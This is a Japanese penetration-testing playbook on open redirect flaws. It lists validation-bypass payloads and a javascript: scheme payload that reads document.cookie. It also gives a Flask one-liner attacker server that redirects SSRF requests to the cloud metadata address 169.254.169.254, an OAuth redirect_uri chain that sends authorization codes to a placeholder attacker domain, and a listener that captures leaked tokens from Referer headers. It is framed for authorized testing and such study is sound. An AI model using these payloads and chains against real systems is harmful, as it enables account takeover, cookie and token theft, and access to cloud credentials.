# Open Redirect（オープンリダイレクト / Unvalidated Redirects）

> **スコープ**: リダイレクト先がユーザー制御になっている脆弱性の検出とチェーン化。検証ロジックのバイパス（プロトコル相対 / userinfo / スラッシュ正規化 / HPP / エンコード / IDN）〜`javascript:` スキーム XSS 化〜SSRF 防御回避〜OAuth `redirect_uri` 連鎖〜Referer 経由 token 漏洩までを扱う。単独では低スコアだが、チェーン先（`OAuth_Attacks.md` / `SSRF.md` / `XSS.md`）で化ける。

## 着火条件

Open Redirect が使われている / 存在する可能性を判定する。下表のシグナルを上から実施し、1 つでも該当すれば本ファイルを使う。**該当ゼロなら閉じてよい**（リダイレクト処理自体が無い or 静的サイト）。

| シグナル | 確認方法 | 該当の意味 |
|---|---|---|
| URL パラメータに `redirect=` `return=` `returnTo=` `next=` `url=` `dest=` `destination=` `continue=` `target=` `forward=` `rurl=` `image_url=` `back=` `r=` `u=` 等が観測される | Burp HTTP history で正規表現検索 | リダイレクト先がパラメータ制御 → §1 系の試行対象 |
| ログイン / ログアウト / パスワードリセット後の遷移先が URL パラメータで指定 | ログイン UI を 1 回通して HTTP history を観察 | 認証フロー絡み → §5（token 漏洩）の前提 |
| エラーページ・404 の「戻る」リンクに元ページ情報が含まれる | 存在しないパスを叩いて 404 HTML を確認 | エラーページ経由の redirect |
| HTML 内に `<meta http-equiv="refresh" content="0;url=...">` が動的生成 | レスポンス HTML を grep | meta refresh 経路（§2）|
| JS で `location.href = ` / `location.replace(` にユーザー制御値が流れる | JS バンドルを `grep -E "location\.(href\|replace\|assign)\s*="` | DOM ベース Open Redirect（§2）|
| 任意パラメータに `https://[ATTACKER_DOMAIN]` を入れて 302 Location が返る | `curl -sI "https://[TARGET]/?next=https://[ATTACKER_DOMAIN]"` | サーバー側 redirect（§1）|

> いずれも該当しない場合は閉じてよい。OAuth の `redirect_uri` バイパスを探しているなら `OAuth_Attacks.md` §1 へ。SSRF 防御回避目的なら `SSRF.md` へ。

## 環境前提

- 実行環境: テスター端末
- 必要なツール:
  - `curl`（ペネトレ用 Linux ディストリ標準）— `-sI` で Location ヘッダーだけ見る
  - Burp Suite Community（Proxy & Repeater で挙動確認）
  - ブラウザ（最終的に「ブラウザがどう解釈するか」が重要 — Chrome / Firefox の差で挙動が変わるバイパスあり）
  - 攻撃者制御ドメイン（フィッシングランディングや SSRF 連鎖の中継。`[ATTACKER_DOMAIN]` プレースホルダ）
- オフライン代替: `curl` だけでもサーバー側 redirect の挙動は確認できる（ブラウザ依存バイパスは確認不可）

## 先に確認すること

着火条件で存在を確定したら、**どのバイパスが通るか・どのチェーンに繋げるか**を選ぶ深掘りを行う。

**リダイレクト発生箇所の種別:**

| 発生箇所 | 確認方法 | 攻撃面 |
|---|---|---|
| サーバー側（HTTP 302 `Location`）| `curl -sI` でヘッダー確認 | §1 系（バイパス全般）|
| meta refresh（HTML 内）| 本文の `<meta http-equiv="refresh">` 検索 | §2（`javascript:` スキームも通りやすい）|
| JavaScript（DOM ベース）| DevTools → Sources で `location.href = ` にブレークポイント | §2 / `XSS.md` の DOM XSS と隣接 |
| HTML link（href のみ・自動遷移なし）| クリック挙動を観察 | 単独は低影響だが phishing 経由で高影響 |

**検証ロジックのフィンガープリント（`redirect=` に値を入れて返り方を観察）:**

| 試行値 | 返り方 | 判定 → 適用ブロック |
|---|---|---|
| `https://[ATTACKER_DOMAIN]` | 302 Location: [ATTACKER_DOMAIN] | 検証なし → §1 はバイパス不要 |
| 同上 | 400 / リダイレクトしない | 検証あり → §1 のバイパス |
| `https://[VICTIM_DOMAIN].evil.example` | 通る | サフィックス検証（§1b）|
| `https://[VICTIM_DOMAIN]@[ATTACKER_DOMAIN]` | 通る | userinfo trick（§1b）|
| `//[ATTACKER_DOMAIN]` | 通る | scheme チェック弱（§1a）|
| `/\/[ATTACKER_DOMAIN]` | 通る | スラッシュ正規化バグ（§1c）|
| `https://[VICTIM_DOMAIN]/path` のみ通る | パスのみ許容（同一ドメイン限定）| §2（`javascript:` XSS）に切替 |

**攻撃者の思考トレース:** 単独 Open Redirect は CVSS 4.3 程度（Low〜Medium）だが、OAuth / SSRF / XSS チェーンが成立すると 8.0+ に跳ね上がる。だから「任意ドメインに飛ばせた」で止めず、§3〜§5 のチェーン先を必ず探す。サーバー側 grep だけで判定せず主要ブラウザで実際に踏ませて確認する。

---

## 1. バイパス系（検証ロジックを破る）

**前提:** `redirect=` 等が存在し検証がある（フィンガープリントで検証方式を特定済み）場合に適用。

**コマンド（バイパスペイロード）:**

```
# [Attacker] 1a. プロトコル相対 URL（scheme 省略）— サーバーが「https:// で始まるか」だけ見る場合に素通り
redirect=//[ATTACKER_DOMAIN]/
redirect=//[ATTACKER_DOMAIN]/path?query=1

# [Attacker] 1b. userinfo trick（@ 以前が userinfo として無視される仕様を悪用）
redirect=https://[VICTIM_DOMAIN]@[ATTACKER_DOMAIN]/
redirect=https://[ATTACKER_DOMAIN]/[VICTIM_DOMAIN]      # 「VICTIM がどこかに出るか」検証だと素通り
redirect=https://[ATTACKER_DOMAIN]/#[VICTIM_DOMAIN]

# [Attacker] 1c. スラッシュ・バックスラッシュの正規化バグ（Chrome/Firefox 差あり）
redirect=/\[ATTACKER_DOMAIN]/
redirect=https:\\[ATTACKER_DOMAIN]/
redirect=///[ATTACKER_DOMAIN]/

# [Attacker] 1d. HPP（同名パラメータ 2 個 — 検証は先頭値・実行は末尾値 等の分裂を突く）
?next=https://[VICTIM_DOMAIN]/safe&next=https://[ATTACKER_DOMAIN]/

# [Attacker] 1e. URL エンコード / ダブルエンコード
redirect=https://[ATTACKER_DOMAIN]%23[VICTIM_DOMAIN]    # %23 = # → fragment として無視
redirect=https://[ATTACKER_DOMAIN]%252e%252e/           # ダブルエンコード（1 回 decode 実装狙い）

# [Attacker] 1f. IDN / Unicode / Punycode（視覚的に似た文字でドメイン偽装）
redirect=https://xn--[ATTACKER_PUNYCODE]/
```

**観測される出力 → 次のアクション:**

| 観測した状態 | 示唆 | 次のアクション |
|---|---|---|
| `https://[ATTACKER_DOMAIN]` がそのまま通る | 検証なし | バイパス不要。チェーン（§3〜§5）へ |
| `//[ATTACKER_DOMAIN]` で通る | scheme チェック弱 | 1a で確定。phishing / チェーンへ |
| substring / suffix 検証あり | ホスト部誤判定 | 1b（userinfo / サブドメイン汚染）|
| `https://` のみ許容で scheme 甘い | 正規化バグ | 1c（バックスラッシュ・複数スラッシュ）|
| HPP で 2 個目が選ばれる | 検証と実行の分裂 | framework 依存（PHP: 最後 / Express: 配列 / Servlet: 最初 / ASP.NET: カンマ結合 / Spring: バインド型依存）|
| 同一ドメインのみ許容（全滅）| ドメイン外 redirect 不可 | §2（`javascript:` XSS）へ切替 |

**注意:** ブラウザ間で `//` `\\` `@` の解釈が異なる。Chrome / Firefox / Safari / Edge それぞれで踏ませて確認する。HPP は `OAuth_Attacks.md` §1.3 と同じパターンで redirect/OAuth 共通の bypass 手段。

---

## 2. `javascript:` スキーム → XSS 化

**前提:** scheme チェックが緩い（`http://` `https://` 以外を許容）、特に**クライアントサイド redirect**（`location.href = userInput`）で成立しやすい。

**コマンド:**

```
# [Attacker] javascript: スキームで JS 実行
redirect=javascript:alert(document.cookie)
# [Attacker] vbscript:（IE 互換が残る古い環境向け）
redirect=vbscript:msgbox(1)
```

成立例（ページ内に以下の JS がある場合）:

```html
<script>
  const next = new URLSearchParams(location.search).get('next');
  location.href = next;   // ← フィルタなし
</script>
```

`?next=javascript:alert(1)` を渡すと `location.href = "javascript:alert(1)"` で JS 実行成立。

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| リダイレクト後 alert / Cookie が攻撃者ホストに飛ぶ | XSS 成立 | `XSS.md` の Cookie スティーリング / DOM 偽装チェーンへ |
| サーバー側 redirect で `javascript:` 拒否 | Location ヘッダーは HTTP 仕様外 | DOM ベース redirect を探す（JS バンドル grep）|

**注意:** モダンブラウザは `javascript:` スキームを `location.href` 経由でブロックする実装がある（Chrome 90+）。`window.open` 経由が通ることがある。

---

## 3. SSRF 防御回避（302 経由で内部到達）

**前提:** SSRF を試みているが、サーバー側が `http://127.0.0.1/` `http://169.254.169.254/` 等を**直接アクセスは拒否**している場合に成立。

**コマンド:**

```bash
# [Attacker] 攻撃者ホストで 302 を返す簡易サーバー（Flask）
python3 -c "
from flask import Flask, redirect
app = Flask(__name__)
@app.route('/')
def r(): return redirect('http://169.254.169.254/latest/meta-data/', code=302)
app.run(host='0.0.0.0', port=8080)
"

# [Attacker] 被害サーバーに SSRF 経由でアクセスさせる
curl "https://[TARGET]/fetch?url=http://[ATTACKER_HOST]:8080/"
# 被害サーバーが 302 を follow すれば 169.254.169.254 に到達 → メタデータ取得
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| メタデータ API のレスポンスが返る | 302 follow + 再検証なし | クラウドメタデータ取得 → `SSRF.md` |
| 302 が follow されない | `follow_redirects=False` | DNS リバインディング・別プロトコル（gopher / file）へ → `SSRF.md` |
| リダイレクト先を再検証して拒否 | SSRF 対策ライブラリ | 他経路へ |

**注意:** 多くの SSRF 対策ライブラリはリダイレクト先 URL を再検証する。詳細は `SSRF.md`（フィルタバイパス手法）。

---

## 4. OAuth `redirect_uri` バイパスとの連鎖

**前提:** OAuth 認可サーバーが `redirect_uri` として `https://[VICTIM_DOMAIN]/oauth/callback` を登録し、VICTIM の別パス（例 `/redirect?next=`）に open redirect が存在する場合に成立。

**コマンド（被害者を踏ませる URL）:**

```
# [Attacker]
https://[AUTH_SERVER]/oauth/authorize?
  response_type=code&
  client_id=[CLIENT_ID]&
  redirect_uri=https://[VICTIM_DOMAIN]/redirect?next=https://[ATTACKER_DOMAIN]&
  scope=openid+email&
  state=[RANDOM]
# 認可サーバーは redirect_uri を [VICTIM_DOMAIN] と判定（パスは見ない実装が多い）→ 通る
# 被害者は /redirect?next=[ATTACKER_DOMAIN]?code=[CODE] に到達 → Open Redirect が code 込みで転送
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 攻撃者ホストに `code` が届く | OAuth code 奪取成立 | code → トークン交換 → アカウント乗っ取り → `OAuth_Attacks.md` §1b |
| 認可サーバーが full URL を検証 | redirect_uri 完全一致 | 連鎖不成立。別の OAuth 弱点へ |

**注意:** OAuth 単独では「redirect_uri は victim 限定」というルールがあっても、open redirect が組み合わさると破綻する点が急所。

---

## 5. 認証 token / OAuth code の Referer 漏洩

**前提:** リダイレクト元 URL のクエリに認証情報（OAuth code / セッション token / reset token）が含まれ、リダイレクト先が外部ドメインの場合に成立。

**コマンド:**

```bash
# 元 URL（被害者が見ているページ）: https://[VICTIM_DOMAIN]/auth/callback?code=[OAUTH_CODE]&state=[STATE]
# このページが Open Redirect で attacker に飛ばすと、ブラウザは Referer に元 URL を含める

# [Attacker] Referer を取得する受信サーバー
python3 -m http.server 8080
# アクセスログに Referer が含まれていれば OAuth code / token が漏洩
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| アクセスログの Referer に `code` / `token` | 認証情報漏洩 | code → アカウント乗っ取り |
| `Referrer-Policy: no-referrer` / `strict-origin` 設定 | Referer 経由は通らない | JS で `location.search` を XHR 送信 → §2（XSS 化）に切替 |

**注意:** 最近のブラウザは `strict-origin-when-cross-origin` がデフォルトでクロスオリジン時はパス・クエリが落ちる。ヘッダー設定次第で不成立。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| `redirect=https://[ATTACKER_DOMAIN]` が 400 | 検証あり | フィンガープリント表で検証方式を特定 → §1a〜1f から該当を選ぶ |
| `javascript:` スキームが拒否される | サーバー側 redirect では HTTP 仕様外 | DOM ベース redirect を探す（JS バンドル grep）|
| 同一ドメインのみ許容（バイパス全滅）| Open Redirect 単独成立不可 | §2 `javascript:` XSS / Reflected XSS の前段に切替 |
| SSRF 連鎖（§3）で 302 が follow されない | SSRF クライアント実装 | DNS リバインディング・別プロトコル（gopher / file）→ `SSRF.md` |
| 影響が「攻撃者ドメインへの 302」だけ | 単独では低スコア | 報告書で「フィッシング誘導の信頼性向上」「OAuth / SSO 連鎖の構成要素」を併記。チェーンで化ける可能性を示す |

---

## 注意点・落とし穴

- **ブラウザ間の URL parser 差異**: `//` `\\` `@` の解釈が Chrome / Firefox / Safari / Edge で異なる。実際に主要ブラウザで踏ませて確認する
- **Reverse Tabnabbing（`target="_blank"` + `rel="noopener"` 欠落）**: 新タブ側から `window.opener.location = 'https://[PHISHING_SITE]'` で元タブを偽サイトに書き換えられる併発攻撃。Chrome 88+ / Firefox 79+ はデフォルトで noopener 相当だがレガシー環境では残る
- **`Content-Disposition` / meta refresh 経由**: Location ヘッダーではないが結果的に別 URL に向かわせる機能は、URL 検証が Location 専用だと抜ける
- **CSRF token を含む URL**: token が URL クエリにあると Referer 漏洩経路で漏れる。token は POST body / カスタムヘッダーに入れるのが本来。別の発見として報告
- **メールフィルタ・URL レピュテーション回避**: `https://[VICTIM_DOMAIN]/redirect?next=https://[PHISH_DOMAIN]` は victim ドメインで始まるため SafeBrowsing / Defender が信頼してしまうことがある
- **severity 判定**: 単独は CVSS 4.3 程度。OAuth / SSRF / XSS チェーン成立で 8.0+。「単独スコア」と「チェーン込みスコア」を併記する

> **個別ブロック固有の注意は各 §N の「注意:」を参照。**

---

## 本番での前提

- **事前合意の要否**: ★★（口頭確認可）— 単独検証は低リスク。フィッシング誘導 PoC / 認証チェーンへの連鎖検証は事前確認推奨
- **想定される SIEM/EDR 検知**: WAF ルール（外部ドメインへの redirect ペイロード検知）/ 不審な Referer / 短時間に複数 redirect URL を試行
- **業務影響リスク**: 低（読み取り系・サーバーへの永続的変更なし）
- **原状回復必須項目**: なし（PoC で踏ませたフィッシングセッションがあれば破棄）
- **取得情報の取扱**: Referer 経由で取得した token / code は認証情報扱い・暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：Web 列挙でリダイレクト系パラメータを発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：レスポンス一次トリアージで `Referrer-Policy` 欠落を確認 → `../../01_Reconnaissance/Web_Response_Triage.md`
- 後：OAuth `redirect_uri` バイパス連鎖 → `OAuth_Attacks.md`（§1b）
- 後：SSRF 防御回避連鎖 → `SSRF.md`
- 後：`javascript:` スキーム経由 XSS 化 → `XSS.md`
- 関連：Cookie / Token を Referer で漏洩させる経路として → `XSS.md`（Cookie スティーリング）
